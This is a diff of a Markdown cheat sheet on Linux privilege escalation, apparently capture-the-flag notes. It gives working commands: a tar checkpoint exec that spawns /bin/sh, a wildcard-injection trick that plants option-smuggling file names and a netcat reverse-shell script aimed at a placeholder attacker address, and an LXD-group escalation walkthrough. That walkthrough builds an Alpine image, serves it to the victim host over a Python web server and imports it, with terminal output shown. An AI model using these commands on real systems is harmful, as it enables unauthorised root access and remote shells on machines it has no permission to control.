@@ -1,38 +1,43 @@
 # Linux Privesc
 
+[LXD](#lxd),
+[Sudo](#sudo),
+[Tar](#tar),
+
+----
 Tar
 ----
 ```shell
-# Checkpoint privesc
+## Checkpoint privesc
 tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint--action=exec='/bin/sh'
 ```
 ```shell
-# Checkpoint wildcard privesc
+## Checkpoint wildcard privesc
 echo 'netcat x.x.x.x 4444 -e /bin/sh' > shell.sh
 touch '--checkpoint-action=exec=sh shell.sh'
 touch '--checkpoint=1'
 tar cf backup.tar * 
-# tar cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh 
+## tar cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh 
 ```
-LXD Privesc
+LXD
 ----
 If user in `lxd` group.
 
 ```shell
-#Initialise LXD
+## Initialise LXD
 lxd init
 ```
 ```shell
-# Clone LXC builder
+## Clone LXC builder
 $ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
 $ sudo ./build-alpine 
 
-# Realise it is broken and fix mirrors
+## Realise it is broken and fix mirrors
 $ wget http://dl-cdn.alpinelinux.org/alpine/MIRRORS.txt
 $ sudo mkdir /usr/share/alphine-mirrors/
 $ cp /usr/share/alpine-mirrors/MIRRORS.txt MIRRORS.txt
 
-# Build will now download
+## Build will now download
 $ sudo ./build-alpine
 Determining the latest release... v3.12
 Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
@@ -45,14 +50,14 @@ Executing busybox-1.31.1-r19.trigger
 OK: 8 MiB in 19 packages
 ```
 ```shell
-# Create python server to upload image to victim
+## Create python server to upload image to victim
 kali@kali:~/Desktop/repos/ctf/tools/lxd-alpine-builder$ ls -lah
 total 3.2M
 -rw-r--r-- 1 root root 3.1M Sep 27 21:46 alpine-v3.12-x86_64-20200927_2146.tar.gz
 kali@kali:~/Desktop/repos/ctf/tools/lxd-alpine-builder$ python3 -m http.server
 ```
 ```shell
-# Download lxd image with victim shell.
+## Download lxd image with victim shell.
 ash@tabby:~$ mkdir alpine
 mkdir alpine
 ash@tabby:~$ cd alpine
@@ -69,12 +74,8 @@ alpine-v3.12-x86_64 100%[===================>]   3.06M   731KB/s    in 4.3s
 
 2020-09-27 21:11:09 (731 KB/s) - ‘alpine-v3.12-x86_64-20200927_2146.tar.gz’ saved [3207041/3207041]
 ```
-
-## Import LXD image
-
-Import image
-
 ```shell
+## Import image
 ash@tabby:~/alpine$ lxc image import alpine-v3.12-x86_64-20200927_2146.tar.gz --alias loveless
 <-v3.12-x86_64-20200927_2146.tar.gz --alias loveless
 ash@tabby:~/alpine$ lxc image list
@@ -85,12 +86,8 @@ lxc image list
 | loveless | 9aa953736e7a | no     | alpine v3.12 (20200927_21:46) | x86_64       | CONTAINER | 3.06MB | Sep 27, 2020 at 9:22pm (UTC) |
 +----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
 ```
-
-## Initialise LXD
-
-Initialize LXD, and create storage device. Select all default options.
-
 ```shell
+## Initialise LXD (select all default)
 ash@tabby:~/alpine$ lxd init
 lxd init
 Would you like to use LXD clustering? (yes/no) [default=no]: 
